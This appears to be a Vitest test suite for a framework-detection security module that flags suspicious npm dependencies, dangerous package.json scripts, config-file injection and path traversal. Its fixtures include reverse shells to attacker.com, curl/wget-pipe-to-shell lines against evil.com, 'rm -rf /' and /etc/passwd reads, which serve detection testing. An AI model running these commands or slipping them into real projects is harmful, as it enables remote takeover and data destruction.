/**
 * Framework Security Detection Tests
 * 
 * Tests for Task 1.1.3: Framework Detection Patterns with security validation
 * Validates that framework detection includes comprehensive security checks
 * to prevent attacks through malicious framework configurations.
 * 
 * @see src/core/foundation/framework-security.ts
 */

import { describe, it, expect, beforeEach, afterEach } from 'vitest';
import { join } from 'path';
import { mkdir, writeFile, rm } from 'fs/promises';
import { tmpdir } from 'os';
import {
  detectFrameworkSecurely,
  getFrameworkSecurityRecommendations,
  isFrameworkSafe,
  TRUSTED_FRAMEWORK_DEPENDENCIES,
  SUSPICIOUS_DEPENDENCY_PATTERNS,
  DANGEROUS_SCRIPT_PATTERNS,
  type SecureFrameworkInfo
} from '../../core/foundation/framework-security.js';

describe('Framework Security Detection', () => {
  let testDir: string;

  beforeEach(async () => {
    // Create temporary test directory
    testDir = join(tmpdir(), `framework-test-${Date.now()}`);
    await mkdir(testDir, { recursive: true });
  });

  afterEach(async () => {
    // Clean up test directory
    try {
      await rm(testDir, { recursive: true });
    } catch {
      // Ignore cleanup errors
    }
  });

  describe('Secure Framework Detection', () => {
    it('should detect Next.js with valid security', async () => {
      // Create a secure Next.js project
      await writeFile(join(testDir, 'next.config.js'), `
        /** @type {import('next').NextConfig} */
        const nextConfig = {
          experimental: {
            appDir: true,
          },
        }
        
        module.exports = nextConfig
      `);

      await writeFile(join(testDir, 'package.json'), JSON.stringify({
        name: 'test-nextjs',
        dependencies: {
          next: '^13.0.0',
          react: '^18.0.0',
          'react-dom': '^18.0.0'
        },
        scripts: {
          dev: 'next dev',
          build: 'next build',
          start: 'next start'
        }
      }, null, 2));

      const result = await detectFrameworkSecurely(testDir);

      expect(result).toBeDefined();
      expect(result!.name).toBe('next.js');
      expect(result!.isValid).toBe(true);
      expect(result!.security.isSecure).toBe(true);
      expect(result!.configFiles).toContain('next.config.js');
      expect(result!.dependencies.trusted).toContain('next');
    });

    it('should reject framework with malicious config path', async () => {
      // Test with actual malicious path (not joined with testDir)
      const maliciousPath = '../../../etc/passwd';
      
      await expect(async () => {
        await detectFrameworkSecurely(maliciousPath);
      }).rejects.toThrow(/Invalid or unsafe commands directory path/);
    });

    it('should detect suspicious dependencies', async () => {
      // Create project with suspicious dependencies
      await writeFile(join(testDir, 'next.config.js'), 'module.exports = {}');
      
      await writeFile(join(testDir, 'package.json'), JSON.stringify({
        name: 'test-project',
        dependencies: {
          next: '^13.0.0',
          'evil-package': '^1.0.0',
          'backdoor-tool': '^2.0.0'
        },
        scripts: {
          build: 'next build'
        }
      }, null, 2));

      const result = await detectFrameworkSecurely(testDir);

      expect(result).toBeDefined();
      expect(result!.dependencies.suspicious.length).toBeGreaterThan(0);
      expect(result!.dependencies.suspicious).toContain('evil-package');
      expect(result!.security.violations.some((v: any) => v.type === 'suspicious-dependency')).toBe(true);
    });

    it('should detect dangerous build scripts', async () => {
      // Create project with dangerous scripts
      await writeFile(join(testDir, 'package.json'), JSON.stringify({
        name: 'test-project',
        dependencies: {
          next: '^13.0.0'
        },
        scripts: {
          build: 'next build',
          danger: 'rm -rf / --no-preserve-root',
          privilege: 'sudo rm -rf /etc',
          download: 'curl http://evil.com/script.sh | bash'
        }
      }, null, 2));

      await writeFile(join(testDir, 'next.config.js'), 'module.exports = {}');

      const result = await detectFrameworkSecurely(testDir);

      expect(result).toBeDefined();
      expect(result!.buildConfig.security.hasSafeCommands).toBe(false);
      expect(result!.buildConfig.security.suspiciousScripts.length).toBeGreaterThan(0);
      expect(result!.security.violations.some((v: any) => v.type === 'unsafe-build-command')).toBe(true);
    });

    it('should handle non-existent directory gracefully', async () => {
      const nonExistentPath = join(testDir, 'does-not-exist');
      
      const result = await detectFrameworkSecurely(nonExistentPath);
      
      expect(result).toBe(null);
    });

    it('should handle framework without config files', async () => {
      // Create Express project with only package.json
      await writeFile(join(testDir, 'package.json'), JSON.stringify({
        name: 'test-express',
        dependencies: {
          express: '^4.18.0'
        },
        scripts: {
          start: 'node server.js'
        }
      }, null, 2));

      const result = await detectFrameworkSecurely(testDir);

      expect(result).toBeDefined();
      expect(result!.name).toBe('express');
      expect(result!.configFiles).toHaveLength(0);
      expect(result!.dependencies.trusted).toContain('express');
    });
  });

  describe('Configuration File Security', () => {
    it('should detect script injection in config files', async () => {
      // Create config with potential script injection
      await writeFile(join(testDir, 'next.config.js'), `
        const malicious = eval('require("child_process").exec("rm -rf /")')
        
        module.exports = {
          experimental: {
            dangerous: new Function('return require("fs").readFileSync("/etc/passwd")')()
          }
        }
      `);

      await writeFile(join(testDir, 'package.json'), JSON.stringify({
        name: 'test-project',
        dependencies: { next: '^13.0.0' }
      }, null, 2));

      const result = await detectFrameworkSecurely(testDir);

      expect(result).toBeDefined();
      expect(result!.security.violations.some((v: any) => v.type === 'script-injection')).toBe(true);
      expect(result!.isValid).toBe(false);
    });

    it('should handle large config files', async () => {
      // Create unusually large config file
      const largeConfig = 'module.exports = {' + 'x'.repeat(1024 * 1024) + '}';
      
      await writeFile(join(testDir, 'next.config.js'), largeConfig);
      await writeFile(join(testDir, 'package.json'), JSON.stringify({
        name: 'test-project',
        dependencies: { next: '^13.0.0' }
      }, null, 2));

      const result = await detectFrameworkSecurely(testDir);

      expect(result).toBeDefined();
      expect(result!.security.warnings).toContain('Configuration file is unusually large');
    });

    it('should handle unreadable config files', async () => {
      // Create config file that can't be read (simulate permission error)
      await writeFile(join(testDir, 'package.json'), JSON.stringify({
        name: 'test-project',
        dependencies: { next: '^13.0.0' }
      }, null, 2));

      // This will be handled by the validateConfigFile function
      const result = await detectFrameworkSecurely(testDir);
      
      // Should still detect framework based on package.json
      expect(result).toBeDefined();
      expect(result!.name).toBe('next.js');
    });
  });

  describe('Dependency Security Analysis', () => {
    it('should identify trusted dependencies', async () => {
      await writeFile(join(testDir, 'package.json'), JSON.stringify({
        name: 'test-project',
        dependencies: {
          react: '^18.0.0',
          'react-dom': '^18.0.0',
          next: '^13.0.0',
          typescript: '^4.9.0'
        }
      }, null, 2));

      await writeFile(join(testDir, 'next.config.js'), 'module.exports = {}');

      const result = await detectFrameworkSecurely(testDir);

      expect(result).toBeDefined();
      expect(result!.dependencies.trusted).toContain('react');
      expect(result!.dependencies.trusted).toContain('next');
      expect(result!.dependencies.trusted).toContain('typescript');
    });

    it('should flag unknown dependencies', async () => {
      await writeFile(join(testDir, 'package.json'), JSON.stringify({
        name: 'test-project',
        dependencies: {
          next: '^13.0.0',
          'unknown-package': '^1.0.0',
          'custom-tool': '^2.0.0'
        }
      }, null, 2));

      await writeFile(join(testDir, 'next.config.js'), 'module.exports = {}');

      const result = await detectFrameworkSecurely(testDir);

      expect(result).toBeDefined();
      expect(result!.dependencies.security.hasUnknownDeps).toBe(true);
    });

    it('should handle malformed package.json', async () => {
      await writeFile(join(testDir, 'package.json'), '{ invalid json');
      await writeFile(join(testDir, 'next.config.js'), 'module.exports = {}');

      const result = await detectFrameworkSecurely(testDir);

      expect(result).toBeDefined();
      expect(result!.dependencies.security.untrustedSources).toContain('Failed to read package.json');
    });
  });

  describe('Build Configuration Security', () => {
    it('should detect privilege escalation in scripts', async () => {
      await writeFile(join(testDir, 'package.json'), JSON.stringify({
        name: 'test-project',
        dependencies: { next: '^13.0.0' },
        scripts: {
          build: 'next build',
          deploy: 'sudo cp -r dist/* /var/www/html/',
          setup: 'su root -c "chmod 777 /tmp"'
        }
      }, null, 2));

      await writeFile(join(testDir, 'next.config.js'), 'module.exports = {}');

      const result = await detectFrameworkSecurely(testDir);

      expect(result).toBeDefined();
      expect(result!.buildConfig.security.privilegeEscalation).toContain('deploy');
      expect(result!.buildConfig.security.privilegeEscalation).toContain('setup');
      expect(result!.security.violations.some((v: any) => v.type === 'privilege-escalation')).toBe(true);
    });

    it('should extract safe build commands', async () => {
      await writeFile(join(testDir, 'package.json'), JSON.stringify({
        name: 'test-project',
        dependencies: { next: '^13.0.0' },
        scripts: {
          dev: 'next dev',
          build: 'next build',
          start: 'next start',
          lint: 'eslint .',
          test: 'vitest'
        }
      }, null, 2));

      await writeFile(join(testDir, 'next.config.js'), 'module.exports = {}');

      const result = await detectFrameworkSecurely(testDir);

      expect(result).toBeDefined();
      expect(result!.buildConfig.buildCommand).toBe('next build');
      expect(result!.buildConfig.devCommand).toBe('next dev');
      expect(result!.buildConfig.security.hasSafeCommands).toBe(true);
    });
  });

  describe('Security Utility Functions', () => {
    it('should provide security recommendations', () => {
      const mockFramework: SecureFrameworkInfo = {
        name: 'next.js',
        pattern: { files: ['next.config.js'], dependencies: ['next'] },
        configFiles: ['next.config.js'],
        dependencies: {
          production: ['next'],
          development: [],
          suspicious: ['evil-package'],
          trusted: ['next'],
          security: {
            hasUnknownDeps: true,
            hasSuspiciousDeps: true,
            untrustedSources: []
          }
        },
        buildConfig: {
          scripts: {},
          security: {
            hasSafeCommands: false,
            suspiciousScripts: ['danger'],
            privilegeEscalation: []
          }
        },
        security: {
          isSecure: false,
          violations: [{
            type: 'suspicious-dependency',
            severity: 'high',
            description: 'Suspicious dependencies detected'
          }],
          warnings: [],
          recommendations: []
        },
        isValid: false
      };

      const recommendations = getFrameworkSecurityRecommendations(mockFramework);

      expect(recommendations).toContain('Framework failed security validation - consider manual review');
      expect(recommendations).toContain('Audit unknown dependencies for security vulnerabilities');
      expect(recommendations).toContain('Review build scripts for potential security issues');
      expect(recommendations).toContain('Address security violations before proceeding');
      expect(recommendations).toContain('Ensure Next.js security headers are configured');
    });

    it('should validate framework safety', () => {
      const safeFramework: SecureFrameworkInfo = {
        name: 'next.js',
        pattern: { files: ['next.config.js'], dependencies: ['next'] },
        configFiles: ['next.config.js'],
        dependencies: {
          production: ['next'],
          development: [],
          suspicious: [],
          trusted: ['next'],
          security: {
            hasUnknownDeps: false,
            hasSuspiciousDeps: false,
            untrustedSources: []
          }
        },
        buildConfig: {
          scripts: { build: 'next build' },
          security: {
            hasSafeCommands: true,
            suspiciousScripts: [],
            privilegeEscalation: []
          }
        },
        security: {
          isSecure: true,
          violations: [],
          warnings: [],
          recommendations: []
        },
        isValid: true
      };

      expect(isFrameworkSafe(safeFramework)).toBe(true);

      // Test with critical violations
      const unsafeFramework = {
        ...safeFramework,
        security: {
          ...safeFramework.security,
          violations: [{
            type: 'privilege-escalation' as const,
            severity: 'critical' as const,
            description: 'Critical security violation'
          }]
        }
      };

      expect(isFrameworkSafe(unsafeFramework)).toBe(false);
    });
  });

  describe('Security Pattern Constants', () => {
    it('should have comprehensive trusted dependencies', () => {
      expect(TRUSTED_FRAMEWORK_DEPENDENCIES.has('react')).toBe(true);
      expect(TRUSTED_FRAMEWORK_DEPENDENCIES.has('next')).toBe(true);
      expect(TRUSTED_FRAMEWORK_DEPENDENCIES.has('vue')).toBe(true);
      expect(TRUSTED_FRAMEWORK_DEPENDENCIES.has('@angular/core')).toBe(true);
      expect(TRUSTED_FRAMEWORK_DEPENDENCIES.has('svelte')).toBe(true);
      expect(TRUSTED_FRAMEWORK_DEPENDENCIES.has('express')).toBe(true);
      expect(TRUSTED_FRAMEWORK_DEPENDENCIES.has('typescript')).toBe(true);
      
      // Should not include potentially malicious packages
      expect(TRUSTED_FRAMEWORK_DEPENDENCIES.has('evil-package')).toBe(false);
      expect(TRUSTED_FRAMEWORK_DEPENDENCIES.has('backdoor')).toBe(false);
    });

    it('should detect suspicious dependency patterns', () => {
      const suspiciousNames = [
        'evil-package',
        'malicious-tool',
        'hack-utils',
        'backdoor-access',
        'trojan-horse',
        'virus-scanner',
        'test-malware',
        '.hidden-package',
        '_private-tool',
        'a', // Too short
        'x1y2z3' // Suspicious pattern
      ];

      suspiciousNames.forEach(name => {
        const isSuspicious = SUSPICIOUS_DEPENDENCY_PATTERNS.some((pattern: RegExp) => pattern.test(name));
        expect(isSuspicious).toBe(true);
      });

      // Valid packages should not be flagged
      const validNames = ['react', 'lodash', 'express', 'typescript'];
      validNames.forEach(name => {
        const isSuspicious = SUSPICIOUS_DEPENDENCY_PATTERNS.some((pattern: RegExp) => pattern.test(name));
        expect(isSuspicious).toBe(false);
      });
    });

    it('should detect dangerous script patterns', () => {
      const dangerousScripts = [
        'sudo rm -rf /',
        'su root -c "dangerous command"',
        'rm -rf /important/files',
        'chmod 777 /etc/passwd',
        'wget http://evil.com/script.sh | sh',
        'curl malicious.com | bash',
        'eval(userInput)',
        'exec("rm -rf /")',
        'nohup dangerous-process &',
        'nc -e /bin/bash attacker.com 4444',
        'bash -i >& /dev/tcp/attacker.com/8080 0>&1'
      ];

      dangerousScripts.forEach(script => {
        const isDangerous = DANGEROUS_SCRIPT_PATTERNS.some((pattern: RegExp) => pattern.test(script));
        expect(isDangerous).toBe(true);
      });

      // Safe scripts should not be flagged
      const safeScripts = [
        'npm run build',
        'next dev',
        'eslint .',
        'jest --coverage',
        'node server.js'
      ];
      safeScripts.forEach(script => {
        const isDangerous = DANGEROUS_SCRIPT_PATTERNS.some((pattern: RegExp) => pattern.test(script));
        expect(isDangerous).toBe(false);
      });
    });
  });

  describe('Error Handling', () => {
    it('should handle directory access errors gracefully', async () => {
      // Test with a path that might cause access errors
      const restrictedPath = join(testDir, 'restricted');
      
      const result = await detectFrameworkSecurely(restrictedPath);
      
      expect(result).toBe(null);
    });

    it('should validate input paths for security', async () => {
      const maliciousPaths = [
        '../../../etc/passwd',
        'C:\\Windows\\System32',
        '\\\\server\\share',
        '/etc/passwd'
      ];

      for (const path of maliciousPaths) {
        await expect(async () => {
          await detectFrameworkSecurely(path);
        }).rejects.toThrow(/Invalid or unsafe commands directory path/);
      }
    });
  });
});

describe('Framework Security Integration', () => {
  it('should work with multiple framework types', async () => {
    // This is primarily a type check and integration test
    const frameworks = ['next.js', 'react', 'vue', 'express'] as const;
    
    frameworks.forEach(framework => {
      expect(typeof framework).toBe('string');
    });
    
    // Ensure constants are properly exported
    expect(Array.isArray(Array.from(TRUSTED_FRAMEWORK_DEPENDENCIES))).toBe(true);
    expect(SUSPICIOUS_DEPENDENCY_PATTERNS.length).toBeGreaterThan(0);
    expect(DANGEROUS_SCRIPT_PATTERNS.length).toBeGreaterThan(0);
  });
});

/**
 * Test suite for unknown dependency scenarios (next-forge style cases)
 */
describe('Unknown Dependency Handling', () => {
  let unknownTestDir: string;

  beforeEach(async () => {
    unknownTestDir = join(tmpdir(), `unknown-deps-test-${Date.now()}`);
    await mkdir(unknownTestDir, { recursive: true });
  });

  afterEach(async () => {
    try {
      await rm(unknownTestDir, { recursive: true });
    } catch {
      // Ignore cleanup errors
    }
  });

  describe('Next-forge Style Projects', () => {
    it('should handle trusted + unknown dependencies gracefully', async () => {
      // Create Next.js config
      await writeFile(join(unknownTestDir, 'next.config.js'), 'module.exports = { reactStrictMode: true }');
      
      // Create package.json with mixed trusted/unknown deps (next-forge style)
      await writeFile(join(unknownTestDir, 'package.json'), JSON.stringify({
        name: 'next-forge-project',
        dependencies: {
          'next': '^14.0.0',  // Trusted
          'react': '^18.0.0', // Trusted
          '@next-forge/core': '^1.0.0',     // Unknown but legitimate
          '@acme/design-system': '^2.1.0',  // Unknown but legitimate
          'custom-auth-lib': '^3.0.0'       // Unknown but legitimate
        },
        scripts: {
          'build': 'next build',
          'dev': 'next dev'
        }
      }, null, 2));

      const framework = await detectFrameworkSecurely(unknownTestDir);
      
      expect(framework).toBeDefined();
      expect(framework!.name).toBe('next.js');
      expect(framework!.isValid).toBe(true); // Should pass despite unknown deps
      
      // Should have trusted dependencies
      expect(framework!.dependencies.trusted).toContain('next');
      expect(framework!.dependencies.trusted).toContain('react');
      
      // Should flag unknown dependencies
      expect(framework!.dependencies.security.hasUnknownDeps).toBe(true);
      expect(framework!.dependencies.security.hasSuspiciousDeps).toBe(false);
      
      // Should be considered safe
      expect(isFrameworkSafe(framework!)).toBe(true);
      
      // Should get audit recommendations
      const recommendations = getFrameworkSecurityRecommendations(framework!);
      expect(recommendations).toContain('Audit unknown dependencies for security vulnerabilities');
    });

    it('should detect and flag suspicious dependency patterns', async () => {
      await writeFile(join(unknownTestDir, 'package.json'), JSON.stringify({
        name: 'suspicious-project',
        dependencies: {
          'next': '^14.0.0',          // Trusted
          'evil-package': '^1.0.0',   // Suspicious - matches evil- pattern
          'test-malware': '^1.0.0',   // Suspicious - matches test- and malware
          'a': '^1.0.0',              // Suspicious - very short name
          'backdoor-util': '^1.0.0'   // Suspicious - matches backdoor pattern
        },
        scripts: {
          'build': 'next build'
        }
      }, null, 2));

      const framework = await detectFrameworkSecurely(unknownTestDir);
      
      expect(framework).toBeDefined();
      expect(framework!.dependencies.security.hasSuspiciousDeps).toBe(true);
      expect(framework!.dependencies.suspicious.length).toBeGreaterThan(0);
      
      // Should have high severity violation for suspicious deps
      const highViolations = framework!.security.violations.filter(
        v => v.severity === 'high' && v.type === 'suspicious-dependency'
      );
      expect(highViolations.length).toBeGreaterThan(0);
      
      // Should not be safe due to high severity violations
      expect(isFrameworkSafe(framework!)).toBe(false);
    });

    it('should handle mixed trusted, unknown, and suspicious dependencies', async () => {
      await writeFile(join(unknownTestDir, 'package.json'), JSON.stringify({
        name: 'mixed-deps-project',
        dependencies: {
          'react': '^18.0.0',              // Trusted
          'next': '^14.0.0',              // Trusted
          '@acme/components': '^1.0.0',    // Unknown but legitimate
          'evil-lib': '^1.0.0',           // Suspicious
          '@company/utils': '^2.0.0'      // Unknown but legitimate
        },
        scripts: {
          'build': 'next build'
        }
      }, null, 2));

      const framework = await detectFrameworkSecurely(unknownTestDir);
      
      expect(framework).toBeDefined();
      expect(framework!.dependencies.trusted.length).toBe(2);
      expect(framework!.dependencies.security.hasUnknownDeps).toBe(true);
      expect(framework!.dependencies.security.hasSuspiciousDeps).toBe(true);
      expect(framework!.dependencies.suspicious).toContain('evil-lib');
      
      // Should fail due to suspicious dependencies
      expect(isFrameworkSafe(framework!)).toBe(false);
    });
  });

  describe('Dependency Pattern Validation', () => {
    it('should correctly identify all suspicious dependency patterns', () => {
      const suspiciousNames = [
        'evil-package', 'malicious-lib', 'hack-tool',     // Prefix patterns
        'backdoor-util', 'trojan-horse', 'virus-scanner', // Content patterns  
        'test-lib', 'demo-app', 'example-util',          // Typosquatting patterns
        '.hidden-pkg', '_internal-lib',                   // Hidden patterns
        '123abc456', 'a1b2c3',                          // Version-like patterns
        'a', 'x', 'zz'                                   // Very short names
      ];

      suspiciousNames.forEach(name => {
        const isSuspicious = SUSPICIOUS_DEPENDENCY_PATTERNS.some(pattern => 
          pattern.test(name)
        );
        expect(isSuspicious).toBe(true);
        if (!isSuspicious) {
          throw new Error(`${name} should be flagged as suspicious`);
        }
      });
    });

    it('should not flag legitimate dependency names', () => {
      const legitimateNames = [
        'react', 'next', 'lodash', 'axios', 'express',          // Common packages
        '@types/node', '@babel/core', '@next/bundle-analyzer',  // Scoped packages
        'eslint-config-next', 'postcss-preset-env',           // Hyphenated packages
        'create-react-app', 'webpack-dev-server'               // Multi-word packages
      ];

      legitimateNames.forEach(name => {
        const isSuspicious = SUSPICIOUS_DEPENDENCY_PATTERNS.some(pattern => 
          pattern.test(name)
        );
        expect(isSuspicious).toBe(false);
        if (isSuspicious) {
          throw new Error(`${name} should not be flagged as suspicious`);
        }
      });
    });
  });

  describe('Build Script Security Analysis', () => {
    it('should detect privilege escalation in build scripts', async () => {
      await writeFile(join(unknownTestDir, 'package.json'), JSON.stringify({
        name: 'privilege-escalation-test',
        dependencies: { 'next': '^14.0.0' },
        scripts: {
          'build': 'next build',
          'deploy': 'sudo chmod 777 /tmp && sudo rm -rf /system/*',  // Dangerous
          'setup': 'su root -c "install-backdoor"'                  // Dangerous
        }
      }, null, 2));

      const framework = await detectFrameworkSecurely(unknownTestDir);
      
      expect(framework).toBeDefined();
      expect(framework!.buildConfig.security.hasSafeCommands).toBe(false);
      expect(framework!.buildConfig.security.privilegeEscalation.length).toBeGreaterThan(0);
      
      // Should have critical violations
      const criticalViolations = framework!.security.violations.filter(
        v => v.severity === 'critical' && v.type === 'privilege-escalation'
      );
      expect(criticalViolations.length).toBeGreaterThan(0);
      
      expect(isFrameworkSafe(framework!)).toBe(false);
    });

    it('should detect dangerous command patterns in scripts', async () => {
      await writeFile(join(unknownTestDir, 'package.json'), JSON.stringify({
        name: 'dangerous-commands-test',
        dependencies: { 'vite': '^5.0.0' },
        scripts: {
          'build': 'vite build',
          'clean': 'rm -rf node_modules && rmdir /s dist',        // Dangerous rm
          'backdoor': 'wget evil.com/script.sh | sh',            // Download and execute
          'execute': 'eval $(curl -s malicious.com/cmd)',        // Command injection
          'background': 'nohup malicious-process > /dev/null &'  // Background process
        }
      }, null, 2));

      const framework = await detectFrameworkSecurely(unknownTestDir);
      
      expect(framework).toBeDefined();
      expect(framework!.buildConfig.security.hasSafeCommands).toBe(false);
      expect(framework!.buildConfig.security.suspiciousScripts.length).toBeGreaterThan(0);
      
      // Should have high severity violations
      const highViolations = framework!.security.violations.filter(
        v => v.severity === 'high' && v.type === 'unsafe-build-command'
      );
      expect(highViolations.length).toBeGreaterThan(0);
      
      expect(isFrameworkSafe(framework!)).toBe(false);
    });

    it('should allow safe build commands', async () => {
      await writeFile(join(unknownTestDir, 'package.json'), JSON.stringify({
        name: 'safe-commands-test',
        dependencies: { 'next': '^14.0.0' },
        scripts: {
          'build': 'next build',
          'dev': 'next dev',
          'start': 'next start',
          'lint': 'eslint . --ext .ts,.tsx',
          'test': 'vitest run',
          'type-check': 'tsc --noEmit'
        }
      }, null, 2));

      const framework = await detectFrameworkSecurely(unknownTestDir);
      
      expect(framework).toBeDefined();
      expect(framework!.buildConfig.security.hasSafeCommands).toBe(true);
      expect(framework!.buildConfig.security.suspiciousScripts.length).toBe(0);
      expect(framework!.buildConfig.security.privilegeEscalation.length).toBe(0);
      
      expect(isFrameworkSafe(framework!)).toBe(true);
    });
  });
});

